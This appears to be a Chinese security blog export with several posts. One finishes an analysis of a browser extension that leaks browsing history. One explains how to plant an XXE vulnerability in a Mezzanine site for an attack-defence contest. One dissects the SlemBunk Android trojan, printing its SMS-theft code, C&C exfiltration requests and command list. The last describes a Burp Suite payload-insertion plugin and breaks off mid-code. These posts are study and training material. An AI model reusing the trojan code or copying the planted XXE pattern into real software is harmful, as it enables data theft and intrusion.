encodeURIComponent(res_prev_url) + "&amp;link=" + (ref ? "1" : "0") + "&amp;sub=" + SIM_ModuleConstants.BROWSER + "&amp;hreferer=" + encodeURIComponent(ref); data = data + "&amp;tmv=" + SIM_ModuleConstants._TMV; data = SIM_Base64.encode(SIM_Base64.encode(data)); data = "e=" + data; var url = utils.db_type.get("server") + "/related"; utils.net.post(url, "json", data, function(result) &#123; log.INFO("Succeeded in posting data"); tabs_prevs[tabId] = tab_url &#125;, function(httpCode) &#123; log.INFO("Failed to retrieve content. (HTTP Code:" + httpCode.status + ")"); log.ERROR("ERROR 8004 ??"); tabs_prevs[tabId] = tab_url &#125;)&#125; 从上述代码中可以看出在关键的浏览器当前url和referer都进行了两次base64编码处理，可以逃过一些普通用户的眼睛，难道这种方式能够躲过google的一些自动审查，比较好奇。 #4 建议码农也不容易，辛辛苦苦写出来的程序不赚钱只能靠窃取用户浏览历史发给第三方来获取回报，想必也是迫不得已，当然对于这种窃取隐私的绝对要抵制。mouse guesture作为一个很好用的特性，笔者已经难以离开，所以在google市场上选择了其他的guesture插件。有了这个教训，相信大家以后使用浏览器插件肯定会多长一双眼睛。]]></content>
      <categories>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>crxMouse Gesture</tag>
        <tag>手势插件</tag>
        <tag>隐私</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于mezzanine的攻防比赛环境搭建及XXE漏洞构造]]></title>
    <url>%2F2016%2F04%2F01%2F%E5%9F%BA%E4%BA%8Emezzanine%E7%9A%84%E6%94%BB%E9%98%B2%E6%AF%94%E8%B5%9B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8AXXE%E6%BC%8F%E6%B4%9E%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[虚拟部署virtualenv是python环境配置和切换工具，进入该虚拟环境后，pip安装的软件不影响当前主环境，这样就能很好的安装几个python版本了，解决了库之间的依赖关系。安装virtualenv和pipsudo apt-get install python-virtualenv python-pip 创建虚拟部署环境12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758gongfangbisai@ubuntu:~$virtualenv -p /usr//bin/python2.7 appgongfangbisai@ubuntu:~$ cd app/gongfangbisai@ubuntu:~/app$ lsbin include lib localgongfangbisai@ubuntu:~/app$ source bin/activate(app)gongfangbisai@ubuntu:~/app$ pip install mezzanineDownloading/unpacking mezzanine Downloading Mezzanine-3.1.10-py2.py3-none-any.whl (5.7MB): 5.7MB downloadedDownloading/unpacking bleach&gt;=1.4 (from mezzanine) Downloading bleach-1.4.1.tar.gz``` 首先使用virtualenv创建一个虚拟节点app，然后使用source激活，再在激活的节点下pip安装mezzanine，安装完mezzanine之后使用mezzanine-project来创建一个工程。 ```bash(app)gongfangbisai@ubuntu:~/app$ mezzanine-project myproject(app)gongfangbisai@ubuntu:~/app$ cd myproject/(app)gongfangbisai@ubuntu:~/app/myproject$ lsdeploy fabfile.py __init__.py local_settings.py manage.py requirements.txt settings.py urls.py wsgi.py(app)gongfangbisai@ubuntu:~/app/myproject$ python manage.py createdbCreating tables ...Creating table auth_permissionCreating table auth_group_permissionsCreating table auth_group..........You just installed Django's auth system, which means you don't have any superusers defined.Would you like to create one now? (yes/no): yesUsername (leave blank to use 'gongfangbisai'): gongfangbisaiEmail address: shengqi158@gmail.comPassword:Password (again):Superuser created successfully.A site record is required.Please enter the domain and optional port in the format 'domain:port'.For example 'localhost:8000' or 'www.example.com'.Hit enter to use the default (127.0.0.1:8000):Creating default site record: 127.0.0.1:8000 ...Installed 2 object(s) from 1 fixture(s)Would you like to install some initial demo pages?Eg: About us, Contact form, Gallery. (yes/no): yesCreating demo pages: About us, Contact form, Gallery ...Installed 16 object(s) from 3 fixture(s)Installing custom SQL ...Installing indexes ...Installed 0 object(s) from 0 fixture(s)(app)gongfangbisai@ubuntu:~/app/myproject$ lsdeploy fabfile.py __init__.pyc local_settings.pyc requirements.txt settings.pyc urls.pydev.db __init__.py local_settings.py manage.py settings.py static wsgi.py``` 使用mezzanine-project myproject创建完工程之后就是创建数据库，使用命令python manage.py createdb 即可，由于mezzanine是基于django框架的，可以看到一些基于django的数据库的创建。再接着会提示输入超级管理用户的用户名，email，密码，请记住，这是mezzanine系统的超级管理员。接下来我们试运行一下： ```bash(app)gongfangbisai@ubuntu:~/app/myproject$ python manage.py runserver 0.0.0.0:8000 再接着在浏览器访问127.0.0.1：8000，如果正常说明mezzanine的搭建第一步ok。 采用uwsgi + nginx 方案部署前期准备首先是安装nginx，uwsgi，再接着集中模板和静态文件，这样好配置静态路径1234python manager.py collectstaticpython manager.py collecttemplatessudo apt-get install nginxsudo apt-get install uwsgi 请求的发送过程大概如下,如果在最后的测试中报错的话就得按照数据的走向来排查问题：--> nginx --> uwsgi --> mezzanine(django)```12345### nginx 配置安装好nginx之后，/etc/init.d/nginx start 即可以启动nginx，在页面访问80端口就能查看到nginx的欢迎页面。重要是配置：nginx的默认配置文件路径：/etc/nginx/在/etc/nginx/sites-enabled 新建自己的配置文件，从sites-available拷贝一个default重命名为mysite_nginx.conf,编辑如下： server { listen 80 default_server; listen [::]:80 default_server ipv6only=on; root /home/gongfangbisai/app/myproject/; #网站的root目录 index index.html index.htm; # Make site accessible from http://localhost/ server_name localhost; location /static { #静态配置文件 autoindex on; alias /home/gongfangbisai/app/myproject/static; access_log off; log_not_found off; } location / { #非静态请求，通过本地的8630端口来通信，这就是uwsgi后续要启动的端口 # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules uwsgi_pass 127.0.0.1:8630; include /home/gongfangbisai/app/myproject/uwsgi_params; } 12345678910111213141516修改完之后，可通过nginx -t 来测试配置文件是否有语法错误，确认ok之后即可启动。### uwsg 配置wsgi.py的内容具体如下：```pythonfrom __future__ import unicode_literalsimport osPROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))settings_module = &quot;%s.settings&quot; % PROJECT_ROOT.split(os.sep)[-1]os.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, settings_module)from django.core.wsgi import get_wsgi_applicationapplication = get_wsgi_application() 下面是配置wsgi：在网站根目录新建wsgi.xml，具体如下：(app)gongfangbisai@ubuntu:~/app/myproject$ cat wsgi.xml1234567891011&lt;uwsgi&gt; &lt;socket&gt;127.0.0.1:8630&lt;/socket&gt; &lt;master&gt;true&lt;/master&gt; &lt;chdir&gt;/home/gongfangbisai/app/myproject/&lt;/chdir&gt; &lt;pythonpath&gt;..&lt;/pythonpath&gt; &lt;module&gt;wsgi&lt;/module&gt; &lt;wsgi-file&gt;wsgi.py&lt;/wsgi-file&gt; &lt;enable-threads&gt;true&lt;/enable-threads&gt;&gt; &lt;processes&gt;4&lt;/processes&gt;&gt; &lt;plugin&gt;python&lt;/plugin&gt;&lt;/uwsgi&gt; socket 是和nginx通信接口，pythonpath 为..，这样才能包含djaong的setting，chdir为网站根目录。1(app)gongfangbisai@ubuntu:~/app/myproject$ uwsgi -x wsgi.xml， 启动起来之后访问首页ok，但是到一些具体的功能页的时候就报404，查看输出日志，uwsgi出现404的时候没动，nginx有日志，也就是说请求到了nginx就没发到uwsgi了，按道理应该是nginx的配置有问题，就查nginx的日志实在找不出问题，而且关键是想不到搜索的关键字，总报404于是就将nginx的配置文件的try_files $uri $uri/ =404;注释掉，这回uwsgi有输出了，显示如下：– unavailable modifier requested: 0 –搜索该关键字，很多人遇到这个问题，好吧，再把相应的库给装上吧 apt-get install uwsgi-plugin-python```123456装上库之后再sudo uwsgi -x wsgi.xml总报：```bashImportError: No module named mezzanineunable to load app 0 (mountpoint=&apos;&apos;) (callable not found or import error) 找了一下，说是python的路径问题，直接在该环境下python，再找sys.path没问题，后来再一看是自己手贱多加了个sudo，导致python环境不对，去掉sudo 运行uwsgi OK。 XXE漏洞的构造前期调研未做好，装了ubuntu13.04，装它的原因就是因为他最近没有报本地提权漏洞，有点因小失大。好吧，总不能从头安装mezzine吧，于是拿libxml下手，选用的python的lxml作为问题程序，其etree.so依赖libxml2和libxslt.于是安装存在xxe漏洞的libxml和libxlst，低于2.9.0，到http://xmlsoft.org/sources/ 下载相应的软件包，这里libxml选择2.8，libxlst选择1.2.27123gongfangbisai@ubuntu:~$ tar -zxvf libxslt-1.1.27.tar.gzgongfangbisai@ubuntu:~$ cd libxslt-1.1.27/gongfangbisai@ubuntu:~/libxslt-1.1.27$ ./configure&amp;make 最后make install 它会装在/usr/local/lib目录下 123456789101112131415161718192021222324gongfangbisai@ubuntu:~/libxslt-1.1.27$ pythonPython 2.7.6 (default, Jun 22 2015, 17:58:13)[GCC 4.8.2] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from lxml import etreeTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;ImportError: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/python2.7/dist-packages/lxml/etree.so)&gt;&gt;&gt;gongfangbisai@ubuntu:~/libxslt-1.1.27$ ldd /usr/lib/python2.7/dist-packages/lxml/etree.so/usr/lib/python2.7/dist-packages/lxml/etree.so: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/python2.7/dist-packages/lxml/etree.so)/usr/lib/python2.7/dist-packages/lxml/etree.so: /usr/lib/x86_64-linux-gnu/libxml2.so.2: version `LIBXML2_2.9.0&apos; not found (required by /usr/lib/x86_64-linux-gnu/libxslt.so.1) linux-vdso.so.1 =&gt; (0x00007fffb9cc6000) libxslt.so.1 =&gt; /usr/lib/x86_64-linux-gnu/libxslt.so.1 (0x00007fca6d652000) libexslt.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libexslt.so.0 (0x00007fca6d43d000) libxml2.so.2 =&gt; /usr/lib/x86_64-linux-gnu/libxml2.so.2 (0x00007fca6d0df000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fca6cec1000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fca6cafc000) libgcrypt.so.11 =&gt; /lib/x86_64-linux-gnu/libgcrypt.so.11 (0x00007fca6c87d000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fca6c679000) libz.so.1 =&gt; /lib/x86_64-linux-gnu/libz.so.1 (0x00007fca6c460000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fca6c159000) /lib64/ld-linux-x86-64.so.2 (0x00007fca6dc02000) libgpg-error.so.0 =&gt; /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007fca6bf55000) 安装完这两个软件后，通过strace python test.py &gt; test.log 2&gt;&amp;1发现其还是依赖原先libxml，第一步想到的是update-alternatives,12gongfangbisai@ubuntu:~/app/myproject/static/media/uploads$ update-alternatives --list libxmlupdate-alternatives: error: no alternatives for libxml 怎么都不提示有两个版本的的libxml，那怎么办呢，强制修改软链接：1234gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo ln -s /usr/local/lib/libxslt.so.1.1.27 libxslt.sogongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo rm libxslt.so.1gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ sudo ln -s /usr/local/lib/libxslt.so.1.1.27 libxslt.so.1gongfangbisai@ubuntu:/usr/lib/x86_64-linux-gnu$ ldconfig 这样libxslt.so的依赖关系搞定了，通过同样的方式搞定libxml2，搞定这两个库之后，还是会提示etree.so依赖2.9的接口，怎么办呢，直接pip install -v lxml==3.0 这个xml版本就不存在依赖2.9接口的问题。在这里也引入了后面会遇到的一个问题，xx测试在python命令行中没有问题，但是在django环境中就有问题，总报库的依赖有问题，猛一回头发现是python虚拟环境搞得鬼，这个虚拟环境会引入libxml和libxslt这种系统lib下的库，但是像python的环境就不会引入，比如/usr/local/lib/python2.7/site-packages/下的，没办法只能在虚拟环境下重新安装了一遍lxml，这样就不会有库依赖的问题了。 gongfangbisai@ubuntu:~/app/myproject/static/media/uploads$ xmllint –noent a.xml //命令行测试比python更容易跟踪 解决了依赖问题，下面就是编码问题了：django的登录认证：./django/contrib/auth/views.py 在这里去掉修改密码的功能，注释掉password_change函数 去掉重置密码链接：直接注释用注释url链接编辑grappelli_safe/templates/registration/ 相关页面 修改上传页面的逻辑处理，对于xml加上对entity的解释功能，这样就能导入一个xxe漏洞，修改filebrowser_safe/views.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051def decode_string(target): try: result = target.decode('utf8').encode('utf8') return (1,result) except: pass try: result = target.decode('gbk').encode('utf8') return (2,result) except: pass try: result = target.decode('gb2312').encode('utf8') return (3,result) except: pass try: result = target.decode('utf16').encode('utf8') return (4,result) except: pass try: result = target.decode('latin1').encode('utf8') return (5,result) except: pass return ''def _upload_file(request): for line in filedata.chunks(): code_type, line = decode_string(line) if code_type != 4 and 'ENTITY' in line: msg = _('illegal xml, ENTITY found!!!!') return HttpResponse(msg) uploadedfile = default_storage.save(file_path, filedata) if default_storage.exists(file_path) and file_path != uploadedfile: default_storage.move(smart_text(uploadedfile), smart_text(file_path), allow_overwrite=True) if file_path.lower().endswith(".xml"): from lxml import etree try: msg = _('path:%s:%s:%s:%s' %(uploadedfile, file_path,directory,type(filedata.chunks()))) if default_storage.exists(file_path): abs_path = smart_text(django_settings.MEDIA_ROOT + "/" + file_path) tree = etree.parse(abs_path) tree.write(abs_path)# return HttpResponse(msg) except Exception,e: msg = _('IOERROR:%s' %(e)) return HttpResponse(msg)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>攻防比赛</tag>
        <tag>xxe</tag>
        <tag>mezzanine</tag>
        <tag>virtualenv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SlemBunk木马浅析]]></title>
    <url>%2F2016%2F04%2F01%2FSlemBunk%E6%9C%A8%E9%A9%AC%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。 #1 恶意行为 ##1.1 控制锁屏行为控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。12345public void onCreate() &#123; super.onCreate(); this.mWakeLock = this. getSystemService("power" ).newWakeLock (1, "MyWakeLock" ); // in PARTIAL_WAKE_LOCK mode regardless of the power off this.mWakeLock .acquire (); &#125; ##1.2 设备管理员权限获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public void checkDeviceAdmin() &#123; ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class ); if(!this .deviceManager. isAdminActive(v0)) &#123; Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" ); v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0)); v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access"); this.startActivity (v1 ); &#125; &#125;``` ##1.3 隐藏图标等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。```javaif(("3". equals("3")) || ( "3" .equals( "1" ))) &#123; this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main . class), 2 , 1);``` ##1.4 计划任务```javaprivate void scheduleLaunch() &#123; Calendar v0 = Calendar .getInstance (); v0. add( 12, this .restartTimeMinutes); Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" ); v1. putExtra("values" , this. getIntent().getStringExtra ("values")); this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0)); &#125;``` ##1.5获取运行的应用slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面```java private String getTopRunning() &#123; List v1 = this .getSystemService ("activity"). getRunningTasks(1 ); String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ; return v3; &#125;``` ##1.6 获取短信记录```javapublic static String readMessagesFromDeviceDB (Context context) &#123; Cursor v8; Uri v1 = Uri .parse ("content://sms/inbox"); String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;; JSONArray v12 = new JSONArray(); try &#123; v8 = context.getContentResolver ().query (v1 , v2 , null, null, null ); if(v8 != null ) &#123; if(!v8.moveToFirst ()) &#123; goto label_55 ; &#125; do &#123; String v6 = v8.getString(v8.getColumnIndex ("address")); String v7 = v8.getString(v8.getColumnIndex ("body")); String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date( Long.parseLong(v8.getString(v8.getColumnIndex ("date"))))); JSONObject v13 = new JSONObject(); v13. put( "from", v6); v13. put( "body", v7); v13. put( "date", v9); v12. put( v13); if(v8.moveToNext ()) &#123; continue; &#125; break; &#125; while(true ); &#125; &#125; ##1.6获取电话号码12345678910111213141516171819202122232425262728293031323334public static String getPhoneNumber(Context context ) &#123; String v0 = context.getSystemService ("phone"). getLine1Number(); if(v0 == null || (v0. equals("" ))) &#123; v0 = ""; &#125; return v0; &#125;``` ##1.7 获取DeviceID```java public static String getDeviceId (Context context) &#123; String v1; String v0 = context.getSystemService ("phone"). getDeviceId(); if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123; v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" ); if(v0 != null &amp;&amp; !v0. equals("" )) &#123; return v0; &#125; v0 = Build.SERIAL ; if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123; return v0; &#125; v1 = "not available"; &#125; else &#123; v1 = v0; &#125; return v1; &#125; ##1.8 设置开机启动木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。12345678910&lt;receiver android:enabled="true " android:exported=" true" android:name=".reiujdksmcoiwerj "&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;receiver android:enabled="true " android:exported=" true" android:name=".hujnkij8uijkjlmj "&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.BOOT_COMPLETED " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; ##1.9 监听短信木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt; receiver android:enabled ="true" android:exported="true " android:name=".riejkmdcwepoksmieru "&gt; &lt;intent-filter android:priority="999 "&gt; &lt;action android:name="android.provider.Telephony.SMS_RECEIVED " /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt;``` 下面是recevier的onReceive方法：```java public void onReceive(Context context, Intent intent ) &#123; SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0); new HashSet (); try &#123; Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize( new HashSet ()))); &#125; catch(Exception v2 ) &#123; v2. printStackTrace(); &#125; Map v3 = SendSMSRecevier .retrieveMessages (intent ); Iterator v10 = v3.keySet().iterator (); while(v10.hasNext()) &#123; Object v7 = v10.next(); CommandCenter v6 = new CommandCenter( v3. get( v7), "", context); if(v6.processCommand ()) &#123; this.abortBroadcast (); continue; &#125; boolean v4 = v6.needToInterceptIncoming (); boolean v5 = v6.needToListen (); if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123; if(!v5) &#123; continue; &#125; SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7)); continue; &#125; SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7)); this.abortBroadcast (); &#125; &#125;``` #2 木马工作流程木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：![][1]在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下： POST / HTTP/1.1Content-Length: 481Content-Type: text/plain; charset=UTF-8Host: 181.174.164.25:2080Connection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4) {“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}123456前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下![添加信用卡][2]![添加详细信息][3]木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下： POST / HTTP/1.1Content-Length: 401Content-Type: text/plain; charset=UTF-8Host: 181.174.164.25:2080Connection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4) {“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}1附录 c&amp;c指令 CommandCenter.commands. add(“#intercept_sms_start”);CommandCenter.commands .add (“#intercept_sms_stop”)CommandCenter.commands .add (“#block_numbers”);CommandCenter.commands .add (“#unblock_all_numbers”);CommandCenter.commands .add (“#unblock_numbers”);CommandCenter.commands .add (“#lock”);CommandCenter.commands .add (“#unlock”);CommandCenter.commands .add (“#send” + “_sms”);CommandCenter.commands .add (“#forward” + “_calls”);CommandCenter.commands .add (“#disable_forward_calls”);CommandCenter.commands .add (“#control_number”);CommandCenter.commands .add (“#update_html”);CommandCenter.commands .add (“#show_html”);CommandCenter.commands .add (“#wipe_data”);```]]></content>
      <categories>
        <category>木马</category>
      </categories>
      <tags>
        <tag>[object Object]</tag>
        <tag>木马浅析</tag>
        <tag>木马分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite 插件开发之RSA加解密]]></title>
    <url>%2F2016%2F02%2F01%2FBurpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8BRSA%E5%8A%A0%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[burpsuit extention 插件 RSA encryption decryption #1，简介 burpsuit是一款非常好用的工具，目前我自己也是重度用户，所以就上手了burpsuit的插件接口开发，这篇文档主要记录了一个解密请求包，插入payload，再加密的插件开发过程。详细的代码见github代码，代码中除了burpsuit的接口实现，还包括各种加解密处理代码。在文档中数据首先是以rsa方式加密des的key得到encryptKey，然后使用des的key加密数据包得到data，再组装成一个JSON格式串，这是加密过程，当然解密过程就是逆向的。插件应用场景主要是用于通过分析apk的实现，或者泄露的密钥，获取其加解密算法，在解密后的数据包中插入payload，发现注入问题等。如下则是加密后的数据包： 1234c=&#123;&quot;data&quot;:&quot;21BhviedgtbwK6rdlK7vzltqxOLxUmU2g5qaO5LWPYTha5fXslmL6jrMkFnJBwpZPZMNl5foxTUHw2Mae++zkWwtzWkKXI9WJ/CJqxO9uORT5I6iUmIG7bBcgnHpmlSNKfFwBvnr9vj3v5ByvW2s2/pL9rSaeD+/8XsX01NA96mC4g5pVBeU5IY9F4tdxH9yobXfN6GzEVhLeiEd30xzMA\u003d\u003d&quot;,&quot;encryptKey&quot;:&quot;bjWZgigAW/ZaAA55v7Yi9AGt2qsP7BfZZISu70qc/xVUVfh5L/Mw/mMbzxkcZ6uXb1vvgXvF7hHYwjsVzvEkRK0rIfIwkcYzn160fvQ/8+F8YBMDLzTEhf8r0KjOLlJV+HgOsS4QG/G9lOU5mnupfrVA9sf54b3OvXHU0TQVG7U\u003d&quot;&#125; 从数据库包能看到大的数据是一个json格式，里面有data，和encryptKey值，encryptKey就是使用RSA加密des 的key得到的，RSA的工作方式和pem文件可通过界面设置，再接着用这个key采用des方式解密data中的内容。操作界面如下： #2，InsertPoint 接口 InsertPoint顾名思义就是注入点，就是payload插入的地方，比如request中的cookie，参数等位置。为了对一些burpsuit不支持的参数格式进行支持就必须实现该接口，可以用在Active Scanner和Intruder中. ##2.1 基础开发知识 最好的方式就是在原有插件的基础上修改，这样能省很多精力，当然如果要一步一步来的话，步骤如下：（1）包含burp的接口文件（2）创建一个包名为burp，在里面创建BurpExtender类，实现IBurpExtender接口，这个BurpExtender类是所有接口的心脏，注意这里涉及到名字都不能改动，burp插件就这么规定的。（3）实现唯一的接口函数123public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) &#123; this. callbacks = callbacks ; &#125; 通过callbacks获取核心基础库能力,像日志，请求，返回值修改等。（4）日志接口 123456789101112131415PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);//输出到插件的outputstdout.println(&quot;Hello output&quot;);// 输出到alerts tabcallbacks.issueAlert(&quot;Hello alerts&quot;);//打印调用栈e.printStackTrace(stderr)``` 有了这些日志接口就能比较好的调试代码了，如果要很好的跟踪请求的，可以在BApp Store中添加&quot;Custom Logger&quot;这个插件，能够记录所有的请求和返回信息。##2.2 getInsertionPoints下面我们就来讲讲如何实现一个`InsertionPoints`接口。第一步继承`IScannerInsertionPointProvider`接口，实现getInsertionPoints()方法，同时通过`callbacks.registerScannerInsertionPointProvider(this)`方法注册成为insertion point provider。下面我们就来看看`getInsertionPoints()`的实现。 @Override public List&lt;IScannerInsertionPoint&gt; getInsertionPoints(IHttpRequestResponse baseRequestResponse) { // 生成insertPoints数组 List&lt;IScannerInsertionPoint&gt; insertionPoints = new ArrayList&lt;IScannerInsertionPoint&gt;(); // 获取请求参数 IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse.getRequest()); List&lt;IParameter&gt; requestParams = requestInfo.getParameters(); for (IParameter parameter : requestParams) { String value = parameter.getValue(); value = helpers.urlDecode(value).trim(); EncryptBean encryptBean = new EncryptBean(); if (parameter.getName().trim().equals(&quot;c&quot;)){//参数中含有c参数表示要加密的内容 encryptBean = JSON.parseObject(value, EncryptBean.class); stdout.println(&quot;private key: &quot; + key.privateKey + &quot; public key &quot; + key.publicKey); try { value = decryptRSAAndDES(key, encryptBean); stdout.println(&quot;after decrypted:Will scan data at parameter &quot; + parameter + &quot; with value decrypted &quot; + value); } catch (Exception e) { e.printStackTrace(stderr); } if (value.isEmpty()) continue; try { String basename = parameter.getName(); //insertionPoints.add(new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); JSONObject jsonObj = JSON.parseObject(value); String basevalue = &quot;&quot;; for(Map.Entry&lt;String, Object&gt; entry: jsonObj.entrySet()){ basename = entry.getKey(); basevalue = entry.getValue().toString(); //在这里传入总的value值以便在InsertionPoint进行分解，构造加密后的request请求，构造InsertionPoint时传入的value为总的value值 insertionPoints.add(0,new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)); stdout.println(&quot;in for:Will scan AES encrypted data at parameter &quot; + basename + &quot; with value &quot; + value); } } catch(Exception e) { } } } return insertionPoints; } 123这一段代码的大体意思就是通过helper.analyzeRequest方法获取所有请求信息，遍历其中的参数信息，当发现参数名等于&quot;c&quot;时就会调用解密过程，这块的代码需要根据参数格式自定义解析参数过程。调用解密的过程大体就是先解析JSON格式，然后解密，得到解密数据的内容后调用`new InsertionPoint(this, baseRequestResponse.getRequest(), basename, value)`实例化一个注入点。一般情况下basename和value是一一对应的，如param1=phoneNum，但是这里我们basename传入param1，value值则是解密后的值如`&#123;&quot;userid&quot;:&quot;51ba27cb-514d-3d86-0000-2f7515a40613&quot;,&quot;task_id&quot;:&quot;1450147269&quot;,&quot;param1&quot;:&quot;000000000000000&quot;,&quot;m&quot;:&quot;https&quot;&#125;`，这么传递是为了方便实例化插入点。接着我们看下InsertionPoint的参数构造。##2.3 InsertionPoint InsertionPoint(BurpExtender newParent, byte[] baseRequest, String basename, String basevalue) { this.parent = newParent; this.baseRequest = baseRequest; this.baseName = basename; //this.baseValue = basevalue; this.value = basevalue; this.baseValue = JSON.parseObject(basevalue).getString(basename); } 1在InsertionPoint的代码中有一个很重要的接口就是buildRequest，这个函数就是用来添加payload。 @Override public byte[] buildRequest(byte[] payload) { String payloadPlain = parent.helpers.bytesToString(payload); String payloadEncrypted = “”; String tmpAESKey = “0123456789abcdef”; parent.stdout.println(“payloadPlain:” + payloadPlain); 